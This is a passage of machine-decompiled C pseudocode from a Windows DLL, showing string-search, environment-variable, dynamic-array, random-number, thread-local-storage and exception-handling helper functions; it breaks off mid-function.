// 10102398: using guessed type int (__thiscall *off_10102398)(void *Block, char);

//----- (1000DD58) --------------------------------------------------------
LONG *__userpurge sub_1000DD58@<eax>(LONG *a1@<ecx>, int a2@<ebx>, int a3, unsigned int a4)
{
  int v4; // eax
  _DWORD *v6; // eax
  LONG v7; // ecx
  int i; // eax
  int v9; // eax
  int v10; // eax
  int v11; // edi
  rsize_t v13; // [esp-Ch] [ebp-2Ch]
  const void *v14; // [esp-8h] [ebp-28h]
  rsize_t v15; // [esp-4h] [ebp-24h]
  unsigned int v16; // [esp+Ch] [ebp-14h]
  char v17; // [esp+13h] [ebp-Dh]

  v4 = *(_DWORD *)(a3 + 4);
  if ( !*(_DWORD *)(v4 + 28) || *(_DWORD *)(*(_DWORD *)(a2 + 4) + 28) != *(_DWORD *)(v4 + 28) )
  {
    v6 = sub_1000E7F7(&a3, 1, 0);
    sub_10007882((int)v6);
  }
  v7 = a1[1];
  if ( *(_DWORD *)(v4 + 28) <= *(_DWORD *)(v7 + 28) )
  {
    v17 = *(_BYTE *)(v7 + 8);
    v16 = 0;
    for ( i = sub_1000DF11(0, (int)a1, a3); ; i = sub_1000DF11(v11 + 1, (int)a1, a3) )
    {
      v11 = i;
      if ( i == -1 || a4 && a4 <= v16 )
        break;
      v9 = *(_DWORD *)(a2 + 4);
      ++v16;
      v15 = 2 * *(_DWORD *)(v9 + 28);
      v14 = *(const void **)(v9 + 12);
      v13 = 2 * (*(_DWORD *)(a1[1] + 28) + 1 - v11);
      v10 = sub_1000D679(a1);
      memcpy_s((void *const)(v10 + 2 * v11), v13, v14, v15);
    }
    if ( v17 )
      sub_1000D6AC((int)a1);
  }
  return a1;
}

//----- (1000DE34) --------------------------------------------------------
LONG *__usercall sub_1000DE34@<eax>(unsigned int a1@<eax>, LONG *a2@<ecx>)
{
  char v4; // bl
  LONG v5; // edi

  if ( a1 < *(_DWORD *)(a2[1] + 28) )
  {
    v4 = sub_1000D4A1(a2);
    *(_WORD *)(sub_1000D679(a2) + 2 * a1) = 0;
    v5 = a2[1];
    *(_DWORD *)(v5 + 32) = sub_1000D699((int)a2);
    if ( v4 )
      sub_1000D6AC((int)a2);
  }
  return a2;
}

//----- (1000DE70) --------------------------------------------------------
BOOL __usercall sub_1000DE70@<eax>(int a1@<eax>, int a2@<ecx>)
{
  return _wcsicmp(*(const wchar_t **)(*(_DWORD *)(a2 + 4) + 12), *(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12)) == 0;
}

//----- (1000DE8B) --------------------------------------------------------
int __userpurge sub_1000DE8B@<eax>(unsigned int a1@<ecx>, int a2@<esi>, wchar_t a3)
{
  int v3; // eax
  _DWORD *v4; // eax
  wchar_t *v5; // eax

  v3 = *(_DWORD *)(a2 + 4);
  if ( a1 > *(_DWORD *)(v3 + 28) )
  {
    v4 = sub_1000E7F7(&a3, 1, 0);
    sub_10007882((int)v4);
  }
  v5 = wcschr((const wchar_t *)(*(_DWORD *)(v3 + 12) + 2 * a1), a3);
  if ( v5 )
    return ((int)v5 - *(_DWORD *)(*(_DWORD *)(a2 + 4) + 12)) >> 1;
  else
    return -1;
}

//----- (1000DEE8) --------------------------------------------------------
int __userpurge sub_1000DEE8@<eax>(int a1@<esi>, wchar_t a2)
{
  wchar_t *v2; // eax

  v2 = wcsrchr(*(const wchar_t **)(*(_DWORD *)(a1 + 4) + 12), a2);
  if ( v2 )
    return ((int)v2 - *(_DWORD *)(*(_DWORD *)(a1 + 4) + 12)) >> 1;
  else
    return -1;
}

//----- (1000DF11) --------------------------------------------------------
int __userpurge sub_1000DF11@<eax>(unsigned int a1@<edx>, int a2@<esi>, int a3)
{
  int v3; // eax
  _DWORD *v4; // eax
  wchar_t *v5; // eax

  v3 = *(_DWORD *)(a2 + 4);
  if ( a1 > *(_DWORD *)(v3 + 28) )
  {
    v4 = sub_1000E7F7(&a3, 1, 0);
    sub_10007882((int)v4);
  }
  v5 = wcsstr((const wchar_t *)(*(_DWORD *)(v3 + 12) + 2 * a1), *(const wchar_t **)(*(_DWORD *)(a3 + 4) + 12));
  if ( v5 )
    return ((int)v5 - *(_DWORD *)(*(_DWORD *)(a2 + 4) + 12)) >> 1;
  else
    return -1;
}

//----- (1000DF75) --------------------------------------------------------
int __stdcall sub_1000DF75(int a1, int a2, unsigned int a3)
{
  LONG *v3; // eax
  int v4; // esi
  LONG *v6; // [esp-4h] [ebp-2Ch]
  LONG v7[2]; // [esp+8h] [ebp-20h] BYREF
  LONG v8[3]; // [esp+10h] [ebp-18h] BYREF
  int v9; // [esp+24h] [ebp-4h]

  sub_1000D372(v8, a2);
  v9 = 0;
  sub_1000D372(v7, a1);
  LOBYTE(v9) = 1;
  v6 = sub_1000D9B4(v8);
  v3 = sub_1000D9B4(v7);
  v4 = sub_1000DF11(a3, (int)v3, (int)v6);
  LOBYTE(v9) = 0;
  sub_1000D3AD(v7);
  v9 = -1;
  sub_1000D3AD(v8);
  return v4;
}
// 1000DF75: using guessed type LONG var_18[3];
// 1000DF75: using guessed type LONG var_20[2];

//----- (1000E007) --------------------------------------------------------
BOOL __userpurge sub_1000E007@<eax>(int a1@<esi>, int a2)
{
  return sub_1000DF11(0, a1, a2) == 0;
}

//----- (1000E01F) --------------------------------------------------------
_DWORD *__stdcall sub_1000E01F(_DWORD *a1, int a2, int a3)
{
  _DWORD *v3; // eax
  int v5[3]; // [esp+4h] [ebp-18h] BYREF
  int v6; // [esp+18h] [ebp-4h]

  *a1 = off_101023F4;
  sub_1000D372(a1 + 1, a2);
  v6 = 0;
  if ( !SetEnvironmentVariableW(*(LPCWSTR *)(a1[2] + 12), *(LPCWSTR *)(*(_DWORD *)(a3 + 4) + 12)) )
  {
    v3 = sub_1000E9DF(v5, 1, 1);
    LOBYTE(v6) = 1;
    sub_1000A947(v3, 788);
  }
  return a1;
}
// 101023F4: using guessed type int (__thiscall *off_101023F4[2])(void *Block, char);
// 1000E01F: using guessed type int var_18[3];

//----- (1000E091) --------------------------------------------------------
void __thiscall sub_1000E091(int *this)
{
  _DWORD v2[5]; // [esp+0h] [ebp-20h] BYREF
  int v3; // [esp+1Ch] [ebp-4h]

  v2[4] = v2;
  v2[3] = this;
  *this = (int)off_101023F4;
  v3 = 1;
  SetEnvironmentVariableW(*(LPCWSTR *)(this[2] + 12), 0);
  v3 = -1;
  sub_1000D3AD(this + 1);
}
// 101023F4: using guessed type int (__thiscall *off_101023F4[2])(void *Block, char);

//----- (1000E0F2) --------------------------------------------------------
int *__thiscall sub_1000E0F2(int *Block, char a2)
{
  sub_1000E091(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E111) --------------------------------------------------------
int __usercall sub_1000E111@<eax>(int a1@<ebx>)
{
  LONG *v1; // eax
  int v3; // [esp+Ch] [ebp-2Ch]
  int v4; // [esp+10h] [ebp-28h] BYREF
  LONG v5; // [esp+14h] [ebp-24h] BYREF
  int v6; // [esp+18h] [ebp-20h] BYREF
  LONG v7; // [esp+1Ch] [ebp-1Ch] BYREF
  LONG v8[3]; // [esp+20h] [ebp-18h] BYREF
  int v9; // [esp+34h] [ebp-4h]

  if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
  {
    sub_1000D372(&v6, a1);
    v9 = 0;
    sub_1000D372(&v4, (int)&v6);
    LOBYTE(v9) = 1;
    v3 = 10;
    do
    {
      v1 = sub_1000E1F7((int)&v4, v8);
      LOBYTE(v9) = 2;
      sub_10001236(v1 + 1, &v5);
      LOBYTE(v9) = 1;
      sub_1000D3AD(v8);
      if ( !sub_1000D65C((int)&v6, (int)&v4) )
        break;
      sub_10001236(&v5, &v7);
      --v3;
    }
    while ( v3 );
    sub_10001236(&v5, (LONG *)(a1 + 4));
    LOBYTE(v9) = 0;
    sub_1000D3AD(&v4);
    v9 = -1;
    sub_1000D3AD(&v6);
  }
  return a1;
}
// 1000E111: using guessed type LONG var_18[3];

//----- (1000E1F7) --------------------------------------------------------
LONG *__usercall sub_1000E1F7@<eax>(int a1@<edi>, LONG *a2)
{
  wchar_t *v2; // eax
  _DWORD *v3; // eax
  wchar_t *v4; // eax
  _DWORD *v5; // eax
  wchar_t *v6; // eax
  _DWORD *v7; // eax
  wchar_t *v8; // eax
  _DWORD *v9; // eax
  int v11[3]; // [esp+Ch] [ebp-50h] BYREF
  int v12[3]; // [esp+18h] [ebp-44h] BYREF
  int v13[3]; // [esp+24h] [ebp-38h] BYREF
  int v14[3]; // [esp+30h] [ebp-2Ch] BYREF
  int v15[2]; // [esp+3Ch] [ebp-20h] BYREF
  int v16[2]; // [esp+44h] [ebp-18h] BYREF
  int v17; // [esp+4Ch] [ebp-10h]
  int v18; // [esp+58h] [ebp-4h]

  v17 = 0;
  if ( *(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
  {
    v2 = (wchar_t *)sub_1000CC40((int)&unk_1017A3E4);
    sub_1000D17D(v16, v2);
    v18 = 1;
    v3 = sub_10014DE5(v15);
    LOBYTE(v18) = 2;
    sub_1000E01F(v11, (int)v16, (int)v3);
    LOBYTE(v18) = 4;
    sub_1000D3AD(v15);
    LOBYTE(v18) = 5;
    sub_1000D3AD(v16);
    v4 = (wchar_t *)sub_1000CC40((int)&unk_1017A41C);
    sub_1000D17D(v16, v4);
    LOBYTE(v18) = 6;
    v5 = sub_10014D59(v15);
    LOBYTE(v18) = 7;
    sub_1000E01F(v12, (int)v16, (int)v5);
    LOBYTE(v18) = 9;
    sub_1000D3AD(v15);
    LOBYTE(v18) = 10;
    sub_1000D3AD(v16);
    v6 = (wchar_t *)sub_1000CC40((int)&unk_1017A45C);
    sub_1000D17D(v16, v6);
    LOBYTE(v18) = 11;
    v7 = sub_10014E71(v15);
    LOBYTE(v18) = 12;
    sub_1000E01F(v13, (int)v16, (int)v7);
    LOBYTE(v18) = 14;
    sub_1000D3AD(v15);
    LOBYTE(v18) = 15;
    sub_1000D3AD(v16);
    v8 = (wchar_t *)sub_1000CC40((int)&unk_1017A498);
    sub_1000D17D(v16, v8);
    LOBYTE(v18) = 16;
    v9 = sub_10014EFD(v15);
    LOBYTE(v18) = 17;
    sub_1000E01F(v14, (int)v16, (int)v9);
    LOBYTE(v18) = 19;
    sub_1000D3AD(v15);
    LOBYTE(v18) = 20;
    sub_1000D3AD(v16);
    sub_100151DD(a2, a1);
    v17 = 1;
    LOBYTE(v18) = 15;
    sub_1000E091(v14);
    LOBYTE(v18) = 10;
    sub_1000E091(v13);
    LOBYTE(v18) = 5;
    sub_1000E091(v12);
    LOBYTE(v18) = 0;
    sub_1000E091(v11);
  }
  else
  {
    sub_1000D372(a2, a1);
    v18 = 0;
    v17 = 1;
  }
  return a2;
}
// 1000E1F7: using guessed type int var_50[3];
// 1000E1F7: using guessed type int var_44[3];
// 1000E1F7: using guessed type int var_38[3];
// 1000E1F7: using guessed type int var_2C[3];

//----- (1000E3AE) --------------------------------------------------------
int __thiscall sub_1000E3AE(int this)
{
  int v2; // edi
  _DWORD *v3; // eax
  _DWORD v5[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    v3 = sub_1000E8EF(v5);
    v5[3] = 0;
    sub_100078FE((int)v3);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1000E3FB) --------------------------------------------------------
int __thiscall sub_1000E3FB(int this)
{
  int v2; // edi
  int result; // eax
  _DWORD *v4; // eax
  _DWORD v5[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    v4 = sub_1000E8EF(v5);
    v5[3] = 0;
    sub_100078FE((int)v4);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (1000E443) --------------------------------------------------------
int __thiscall sub_1000E443(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (1000E47D) --------------------------------------------------------
int __thiscall sub_1000E47D(int this)
{
  int v2; // edi
  _DWORD *v3; // eax
  _DWORD v5[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    v3 = sub_1000E8EF(v5);
    v5[3] = 0;
    sub_100078FE((int)v3);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (1000E4CA) --------------------------------------------------------
_DWORD *__thiscall sub_1000E4CA(_DWORD *Block, char a2)
{
  *Block = &off_101023F8;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 101023F8: using guessed type int (__thiscall *off_101023F8)(void *Block, char);

//----- (1000E4EA) --------------------------------------------------------
void *__thiscall sub_1000E4EA(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10102398;
  v4 = 1;
  j__free(*(void **)(this + 12));
  *(_DWORD *)(this + 12) = 0;
  v4 = -1;
  return sub_100185A9((_DWORD *)this);
}
// 10102398: using guessed type int (__thiscall *off_10102398)(void *Block, char);

//----- (1000E548) --------------------------------------------------------
int __thiscall sub_1000E548(_DWORD *this, int *a2, unsigned int a3)
{
  int v5; // edi
  int v6; // eax
  unsigned int i; // eax
  int result; // eax
  int v9; // [esp+14h] [ebp+Ch]

  if ( a3 != (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
    (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a3, &unk_1014151E);
  v5 = *this;
  v9 = *a2;
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  (*(void (__thiscall **)(_DWORD *, int))(v5 + 60))(this, v6 + 1);
  for ( i = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this); i > a3; --i )
    *(_DWORD *)(this[3] + 4 * i) = *(_DWORD *)(this[3] + 4 * i - 4);
  result = this[3];
  *(_DWORD *)(result + 4 * a3) = v9;
  ++this[1];
  return result;
}

//----- (1000E5AB) --------------------------------------------------------
int __thiscall sub_1000E5AB(_DWORD *this, unsigned int a2)
{
  unsigned int v2; // edi

  v2 = a2;
  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1014151F);
  --this[1];
  while ( v2 < (*(int (__thiscall **)(_DWORD *))(*this + 4))(this) )
  {
    *(_DWORD *)(this[3] + 4 * v2) = *(_DWORD *)(this[3] + 4 * v2 + 4);
    ++v2;
  }
  *(_DWORD *)(this[3] + 4 * (*(int (__thiscall **)(_DWORD *))(*this + 4))(this)) = 0;
  return (*(int (__thiscall **)(_DWORD *))(*this + 88))(this);
}

//----- (1000E5F7) --------------------------------------------------------
int __thiscall sub_1000E5F7(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101415F6);
  return this[3] + 4 * a2;
}

//----- (1000E618) --------------------------------------------------------
int __thiscall sub_1000E618(_DWORD *this, int a2)
{
  (*(void (__thiscall **)(_DWORD *, int, void *))(*this + 76))(this, a2, &unk_101415F7);
  return this[3] + 4 * a2;
}

//----- (1000E639) --------------------------------------------------------
unsigned int __thiscall sub_1000E639(_DWORD *this, unsigned int a2, int a3, int a4)
{
  unsigned int v5; // edi
  unsigned int result; // eax

  (*(void (__thiscall **)(_DWORD *, unsigned int, void *))(*this + 76))(this, a2, &unk_1014163E);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 60))(a3, a2);
  (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 60))(a4, this[1] - a2);
  v5 = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
  if ( result )
  {
    do
    {
      if ( v5 >= a2 )
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a4 + 36))(a4, this[3] + 4 * v5);
      else
        (*(void (__thiscall **)(int, unsigned int))(*(_DWORD *)a3 + 36))(a3, this[3] + 4 * v5);
      ++v5;
      result = (*(int (__thiscall **)(_DWORD *))(*this + 4))(this);
    }
    while ( v5 < result );
  }
  return result;
}

//----- (1000E6AB) --------------------------------------------------------
void *__thiscall sub_1000E6AB(void *Block, char a2)
{
  sub_1000E4EA((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E6CA) --------------------------------------------------------
_DWORD *__stdcall sub_1000E6CA(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_100FBF5C;
  return result;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);

//----- (1000E6EF) --------------------------------------------------------
void *__usercall sub_1000E6EF@<eax>(int a1@<eax>, _DWORD *a2@<esi>)
{
  void *result; // eax

  a2[1] = 0;
  a2[2] = a1;
  result = operator new(4 * a1);
  a2[3] = result;
  return result;
}

//----- (1000E70F) --------------------------------------------------------
int __cdecl sub_1000E70F(unsigned int a1)
{
  int v1; // edi
  int v2; // esi

  v1 = rand() << 15;
  v2 = (v1 | rand()) << 15;
  return ((unsigned int)v2 | (unsigned __int64)(unsigned int)rand()) % a1;
}

//----- (1000E73C) --------------------------------------------------------
void sub_1000E73C()
{
  __time32_t v0; // esi
  DWORD CurrentThreadId; // eax

  v0 = time(0);
  CurrentThreadId = GetCurrentThreadId();
  srand(v0 + CurrentThreadId);
}

//----- (1000E758) --------------------------------------------------------
LPVOID sub_1000E758()
{
  DWORD LastError; // edi
  LPVOID Value; // eax
  LPVOID v2; // esi

  LastError = GetLastError();
  Value = TlsGetValue(dwTlsIndex);
  if ( !Value )
    Value = (LPVOID)sub_10015C1C();
  v2 = Value;
  SetLastError(LastError);
  return v2;
}

//----- (1000E785) --------------------------------------------------------
void __cdecl sub_1000E785(LPVOID lpTlsValue)
{
  DWORD LastError; // esi

  LastError = GetLastError();
  if ( !TlsSetValue(dwTlsIndex, lpTlsValue) )
    sub_10015C59();
  SetLastError(LastError);
}
// 10015C59: using guessed type void __noreturn sub_10015C59(void);

//----- (1000E7B3) --------------------------------------------------------
_DWORD *__thiscall sub_1000E7B3(_DWORD *this, int a2)
{
  int v3; // eax

  *this = &off_10102418;
  v3 = sub_1000E758();
  sub_1000E785((LPVOID)(v3 + 1));
  return this;
}
// 1000E758: using guessed type int sub_1000E758(void);
// 10102418: using guessed type int (__thiscall *off_10102418)(void *Block, char);

//----- (1000E7D8) --------------------------------------------------------
_DWORD *__thiscall sub_1000E7D8(_DWORD *Block, char a2)
{
  sub_1000E843(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000E7F7) --------------------------------------------------------
_DWORD *__thiscall sub_1000E7F7(_DWORD *this, char a2, int a3)
{
  DWORD LastError; // edi
  char *v5; // eax
  void *CurrentThreadId; // eax

  *this = &off_10102418;
  LastError = GetLastError();
  v5 = (char *)sub_1000E758();
  sub_1000E785(v5 + 1);
  if ( a2 )
  {
    CurrentThreadId = (void *)GetCurrentThreadId();
    sub_1001535A(CurrentThreadId, a3);
  }
  SetLastError(LastError);
  return this;
}
// 10102418: using guessed type int (__thiscall *off_10102418)(void *Block, char);

//----- (1000E843) --------------------------------------------------------
void __thiscall sub_1000E843(_DWORD *this)
{
  int v1; // eax
  _DWORD v2[8]; // [esp+0h] [ebp-20h] BYREF

  v2[4] = v2;
  v2[3] = 0;
  *this = &off_10102418;
  v2[7] = 0;
  v1 = sub_1000E758();
  sub_1000E785((LPVOID)(v1 - 1));
}
// 1000E758: using guessed type int sub_1000E758(void);
// 10102418: using guessed type int (__thiscall *off_10102418)(void *Block, char);

//----- (1000E88D) --------------------------------------------------------
int __stdcall sub_1000E88D(int a1, char a2, int a3)
{
  *(_DWORD *)a1 = &unk_10102930;
  sub_1000E7F7(a2, a3);
  *(_DWORD *)(a1 + *(_DWORD *)(*(_DWORD *)a1 + 4)) = &off_101022EC;
  return a1;
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 101022EC: using guessed type int (__stdcall *off_101022EC)(char);

//----- (1000E8EF) --------------------------------------------------------
_DWORD *__stdcall sub_1000E8EF(_DWORD *a1)
{
  sub_1000E7F7(a1, 1, 0);
  *a1 = &off_100FBF4C;
  return a1;
}
// 100FBF4C: using guessed type int (__thiscall *off_100FBF4C)(void *Block, char);

//----- (1000E927) --------------------------------------------------------
void __thiscall sub_1000E927(_DWORD *this)
{
  *this = &off_100FBF4C;
  sub_1000E843(this);
}
// 100FBF4C: using guessed type int (__thiscall *off_100FBF4C)(void *Block, char);

//----- (1000E950) --------------------------------------------------------
int __stdcall sub_1000E950(int a1)
{
  *(_DWORD *)a1 = &unk_10102930;
  sub_1000E7F7(1, 0);
  *(_DWORD *)(a1 + *(_DWORD *)(*(_DWORD *)a1 + 4)) = &off_100FBF54;
  return a1;
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 100FBF54: using guessed type int (__stdcall *off_100FBF54)(char);

//----- (1000E9A1) --------------------------------------------------------
_DWORD *__stdcall sub_1000E9A1(_DWORD *a1, int a2)
{
  sub_1000E7F7(a1, 1, 0);
  *a1 = &off_10102420;
  a1[1] = a2;
  return a1;
}
// 10102420: using guessed type int (__thiscall *off_10102420)(void *Block, char);

//----- (1000E9DF) --------------------------------------------------------
_DWORD *__thiscall sub_1000E9DF(_DWORD *this, char a2, int a3)
{
  DWORD LastError; // eax

  if ( a3 )
  {
    *this = &unk_100FC1FC;
    LastError = GetLastError();
    sub_1000E7F7(a2, LastError);
  }
  *(_DWORD *)((char *)this + *(_DWORD *)(*this + 4)) = &off_100FC1F4;
  this[1] = GetLastError();
  return this;
}
// 1000E7F7: using guessed type _DWORD __stdcall sub_1000E7F7(char, _DWORD);
// 100FC1F4: using guessed type int (__stdcall *off_100FC1F4)(char);

//----- (1000EA57) --------------------------------------------------------
int __usercall sub_1000EA57@<eax>(int a1@<esi>)
{
  *(_DWORD *)a1 = off_10102428;
  *(_BYTE *)(a1 + 4) = 0;
  *(_DWORD *)(a1 + 8) = _set_se_translator((void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *))sub_1000EAE1);
  *(_BYTE *)(a1 + 4) = 1;
  return a1;
}
// 10102428: using guessed type int (__thiscall *off_10102428[4])(void *Block, char);

//----- (1000EA76) --------------------------------------------------------
void (__cdecl **__thiscall sub_1000EA76(
        void (__cdecl **Block)(unsigned int, struct _EXCEPTION_POINTERS *),
        char a2))(unsigned int, struct _EXCEPTION_POINTERS *)
{
  sub_1000EA95(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000EA95) --------------------------------------------------------
void (__cdecl *__thiscall sub_1000EA95(
        void (__cdecl **this)(unsigned int, struct _EXCEPTION_POINTERS *)))(unsigned int, struct _EXCEPTION_POINTERS *)
{
  void (__cdecl *result)(unsigned int, struct _EXCEPTION_POINTERS *); // eax
  _DWORD v3[7]; // [esp+0h] [ebp-1Ch] BYREF

  result = (void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *))&loc_100A06ED;
  v3[3] = v3;
  *this = (void (__cdecl *)(unsigned int, struct _EXCEPTION_POINTERS *))off_10102428;
  v3[6] = 0;
  if ( *((_BYTE *)this + 4) )
  {
    result = _set_se_translator(this[2]);
    *((_BYTE *)this + 4) = 0;
  }
  return result;
}
// 10102428: using guessed type int (__thiscall *off_10102428[4])(void *Block, char);

//----- (1000EAE1) --------------------------------------------------------
void __cdecl __noreturn sub_1000EAE1(unsigned int a1, struct _EXCEPTION_POINTERS *a2)
{
  int ExceptionCode; // esi
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-1Ch] BYREF
  int v4[5]; // [esp+Ch] [ebp-14h] BYREF

  ExceptionCode = a2->ExceptionRecord->ExceptionCode;
  sub_1000E7F7(v4, 1, ExceptionCode);
  v4[0] = (int)&off_10102A68;
  v4[1] = ExceptionCode;
  v4[4] = 1;
  sub_10051122(pExceptionObject, (int)v4);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVHfpmmmiamaHpnxxaqhf_sr__);
}
// 10102A68: using guessed type int (__thiscall *off_10102A68)(void *Block, char);
// 1000EAE1: using guessed type _DWORD pExceptionObject[2];

//----- (1000EB36) --------------------------------------------------------
_DWORD *__usercall sub_1000EB36@<eax>(_DWORD *a1@<esi>)
{
  *a1 = off_1010242C;
  a1[1] = SetErrorMode(0x8001u);
  return a1;
}
// 1010242C: using guessed type int (__thiscall *off_1010242C[3])(void *Block, char);

//----- (1000EB4D) --------------------------------------------------------
_DWORD *__thiscall sub_1000EB4D(_DWORD *Block, char a2)
{
  sub_1000EB6C(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000EB6C) --------------------------------------------------------
UINT __thiscall sub_1000EB6C(_DWORD *this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  *this = off_1010242C;
  v2[6] = 0;
  return SetErrorMode(this[1]);
}
// 1010242C: using guessed type int (__thiscall *off_1010242C[3])(void *Block, char);

//----- (1000EBAD) --------------------------------------------------------
void __cdecl __noreturn sub_1000EBAD()
{
  int pExceptionObject; // [esp+0h] [ebp-14h] BYREF
  int v1[4]; // [esp+4h] [ebp-10h] BYREF

  sub_1000E7F7(v1, 1, 0);
  v1[0] = (int)&off_10102A68;
  v1[3] = 1;
  sub_1000EE19(&pExceptionObject, (int)v1);
  _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVGfnpwoMadjdwvkl_sr__);
}
// 10102A68: using guessed type int (__thiscall *off_10102A68)(void *Block, char);

//----- (1000EBF7) --------------------------------------------------------
_DWORD *__usercall sub_1000EBF7@<eax>(_DWORD *a1@<esi>)
{
  *a1 = off_10102430;
  a1[1] = _set_new_handler((int (__cdecl *)(unsigned int))sub_1000EBAD);
  a1[2] = _set_new_mode(1);
  return a1;
}
// 10102430: using guessed type int (__thiscall *off_10102430[2])(void *Block, char);

//----- (1000EC19) --------------------------------------------------------
void *__thiscall sub_1000EC19(void *Block, char a2)
{
  sub_1000EC38(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1000EC38) --------------------------------------------------------
int __thiscall sub_1000EC38(void *this)
{
  _DWORD v3[7]; // [esp+0h] [ebp-1Ch] BYREF

  v3[3] = v3;
  *(_DWORD *)this = off_10102430;
  v3[6] = 0;
  _set_new_handler(*((int (__cdecl **)(unsigned int))this + 1));
  return _set_new_mode(*((_DWORD *)this + 2));
}
// 10102430: using guessed type int (__thiscall *off_10102430[2])(void *Block, char);

//----- (1000EC84) --------------------------------------------------------
int __usercall sub_1000EC84@<eax>(_DWORD *a1@<esi>)
{
  int result; // eax

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*a1 + 20))(a1) )
    (*(void (__thiscall **)(_DWORD *))(*a1 + 16))(a1);
  if ( a1[1]-- == 1 )
    *((_BYTE *)a1 + 14) = 0;
  result = (*(int (__thiscall **)(_DWORD *))(*a1 + 12))(a1);
  if ( !a1[1] )
    a1[2] = -1;
  return result;
}

//----- (1000ECB1) --------------------------------------------------------
char __usercall sub_1000ECB1@<al>(int *a1@<esi>)
{
  _DWORD *v1; // eax
  _BYTE *v2; // eax
  char v3; // bl
  bool v4; // zf
  int v5; // eax
  int v7; // [esp+0h] [ebp-14h] BYREF
  int v8; // [esp+4h] [ebp-10h] BYREF
  int v9; // [esp+10h] [ebp-4h]

  if ( (*(unsigned __int8 (__thiscall **)(int *))(*a1 + 4))(a1) )
  {
    v1 = sub_10015CC2(&v8);
    v9 = 0;
    goto LABEL_3;
  }
  (*(void (__thiscall **)(int *))(*a1 + 8))(a1);
  if ( !a1[1] )
    a1[2] = GetCurrentThreadId();
  v2 = (_BYTE *)++a1[1];
  v3 = 1;
  v4 = *((_BYTE *)a1 + 13) == 0;
  *((_BYTE *)a1 + 14) = 1;
  if ( !v4 )
  {
    v5 = *a1;
    *((_BYTE *)a1 + 14) = 0;
    (*(void (__thiscall **)(int *))(v5 + 12))(a1);
    v1 = sub_10015CC2(&v7);
    v9 = 1;
LABEL_3:
    sub_1000EDF9((int)v1);
  }
  if ( v2 == (_BYTE *)1 )
  {
    v2 = sub_1001319F();
    if ( !v2 || (LOBYTE(v2) = v2[96], !(_BYTE)v2) )
      v3 = 0;
    *((_BYTE *)a1 + 12) = v3;
  }
  return (char)v2;
}

//----- (1000ED47) --------------------------------------------------------
char __thiscall sub_1000ED47(_BYTE *this)
{
  return this[13];
}

//----- (1000ED4B) --------------------------------------------------------
bool __thiscall sub_1000ED4B(_BYTE *this)
{
  _BYTE *v2; // eax

  v2 = sub_1001319F();
  return this[14] && !this[12] && v2 && v2[96];
}

//----- (1000ED72) --------------------------------------------------------
_DWORD *__usercall sub_1000ED72@<eax>(int a1@<ecx>, _DWORD *a2@<esi>)
{
  *a2 = &off_10102434;
  a2[1] = a1;
